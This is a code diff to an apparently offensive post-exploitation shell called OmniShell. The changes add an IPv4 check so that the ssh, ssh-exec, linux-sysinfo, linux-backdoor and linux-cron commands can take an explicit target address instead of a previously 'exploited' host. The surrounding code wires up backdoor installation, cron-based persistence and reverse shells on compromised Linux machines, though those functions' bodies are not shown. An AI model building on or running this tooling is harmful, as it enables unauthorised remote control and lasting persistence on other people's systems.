@@ -132,6 +132,14 @@ class OmniShell:
         target = self.last_target
         u, p, d = self.creds['user'], self.creds['pass'], self.creds['domain']
 
+        # Helper: check if string is an IPv4 address
+        def is_ip(s):
+            if not s: return False
+            parts_ip = s.split('.')
+            if len(parts_ip) != 4: return False
+            return all(part.isdigit() for part in parts_ip)
+
+
         if cmd in ["exit", "quit"]:
             print(f"{Fore.YELLOW}Shutting down AMMO engine...")
             sys.exit(0)
@@ -974,15 +982,39 @@ class OmniShell:
 
         # --- LINUX & ADB ---
         elif cmd == "ssh":
-            port = int(args[0]) if args else 22
-            await asyncio.to_thread(self.control.ssh_interactive, target, u, p, port)
+            if args and is_ip(args[0]):
+                ssh_target = args[0]
+                port = int(args[1]) if len(args) > 1 else 22
+            else:
+                ssh_target = target
+                port = int(args[0]) if args else 22
+            if not ssh_target:
+                print(f"{Fore.RED}[!] No target set. Use 'exploit <ip>' first or 'ssh <ip> [port]'")
+                return
+            await asyncio.to_thread(self.control.ssh_interactive, ssh_target, u, p, port)
 
         elif cmd == "ssh-exec":
             if not args: return
-            res = await asyncio.to_thread(self.control.ssh_exec, target, u, p, " ".join(args))
+            # Allow explicit IP: ssh-exec <ip> <command> or use current target
+            if is_ip(args[0]):
+                ssh_target = args[0]
+                command = " ".join(args[1:])
+            else:
+                ssh_target = target
+                command = " ".join(args)
+            if not ssh_target:
+                print(f"{Fore.RED}[!] No target set. Use 'exploit <ip>' first or provide IP.")
+                return
+            res = await asyncio.to_thread(self.control.ssh_exec, ssh_target, u, p, command)
             print(res)
 
         elif cmd == "linux-sysinfo":
+            if not target:
+                if args:
+                    target = args[0]
+                else:
+                    print(f"{Fore.RED}[!] No target set. Use 'exploit <ip>' first or 'linux-sysinfo <ip>'")
+                    return
             res = await asyncio.to_thread(self.control.linux_get_system_info, target, u, p)
             for k, v in res.items(): print(f"  {k.upper()}: {v}")
 
@@ -991,11 +1023,24 @@ class OmniShell:
             await asyncio.to_thread(self.control.linux_reverse_shell, target, u, p, args[0], int(args[1]))
 
         elif cmd == "linux-backdoor":
-            await asyncio.to_thread(self.control.linux_install_backdoor, target, u, p)
+            backdoor_target = args[0] if args and is_ip(args[0]) else target
+            if not backdoor_target:
+                print(f"{Fore.RED}[!] No target set. Use 'exploit <ip>' first or 'linux-backdoor <ip>'")
+                return
+            await asyncio.to_thread(self.control.linux_install_backdoor, backdoor_target, u, p)
 
         elif cmd == "linux-cron":
             if not args: return
-            await asyncio.to_thread(self.control.linux_persistence_cron, target, u, p, " ".join(args))
+            if is_ip(args[0]):
+                cron_target = args[0]
+                command = " ".join(args[1:])
+            else:
+                cron_target = target
+                command = " ".join(args)
+            if not cron_target:
+                print(f"{Fore.RED}[!] No target set. Use 'exploit <ip>' first or provide IP.")
+                return
+            await asyncio.to_thread(self.control.linux_persistence_cron, cron_target, u, p, command)
 
         # --- ANDROID ADB ---
         elif cmd == "adb-connect":
